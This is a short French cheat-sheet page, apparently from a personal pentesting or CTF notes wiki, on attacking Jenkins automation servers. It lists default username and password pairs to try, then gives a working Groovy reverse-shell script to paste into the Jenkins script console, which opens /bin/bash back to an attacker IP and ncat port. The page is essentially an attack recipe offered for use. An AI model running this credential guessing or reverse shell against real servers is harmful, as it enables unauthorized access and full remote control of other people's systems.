<sub>[Procédure serveur](server_procedure.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Cryptage](cryptage.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Outils](tools.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Sites utiles](useful_website.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Lexique](lexique.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Index](index.md)</sub>
<sub>[Retour](web_server.md)</sub>
#Jenkins

**Utilisation :** free and open-source automation server, help to  building, testing, and deploying

**CMD :** cmd ***ARG***

**Utilisateurs fréquents :**
- admin:password
- admin:admin
- root:root
- root:password
- admin:admin1
- admin:password1
- root:password1

**Procédure :**
- CVE : groovy script dans les input => administration de Jenkins => console de script :
  >String host="*IP_ATTACKER*";
      int port=*PORT_NCAT*;
      String cmd="/bin/bash";
      Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
      Socket(host,port);
      InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
      OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed())
      {while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());
      while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try
      {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
